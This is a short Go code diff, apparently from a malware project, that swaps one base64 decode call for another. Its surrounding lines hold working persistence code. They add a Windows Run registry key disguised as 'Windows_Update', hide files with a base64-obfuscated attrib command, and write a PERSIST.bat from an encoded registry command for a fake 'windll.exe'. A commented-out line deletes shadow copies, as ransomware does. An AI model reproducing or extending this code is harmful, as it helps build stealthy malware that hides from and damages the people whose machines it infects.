@@ -29,7 +29,7 @@ func Install() {
 	//REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\
 	utils.Run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
 	//attrib +H +S %APPDATA%\\Windows_Update\\
-	utils.Run(base64.Base64Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==") + TARGET_FILE_NAME)
+	utils.Run(base64.Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==") + TARGET_FILE_NAME)
 
 	// TODO: Run with admin
 	//Run("vssadmin.exe Delete Shadows /All /Quiet") //admin
@@ -43,7 +43,7 @@ func Uninstall() {
 func PersistenceBat() {
 	//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
 	var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
-	DecodedRegAdd := base64.Base64Decode(RegAdd)
+	DecodedRegAdd := base64.Decode(RegAdd)
 
 	PERSIST, _ := os.Create("PERSIST.bat")
 
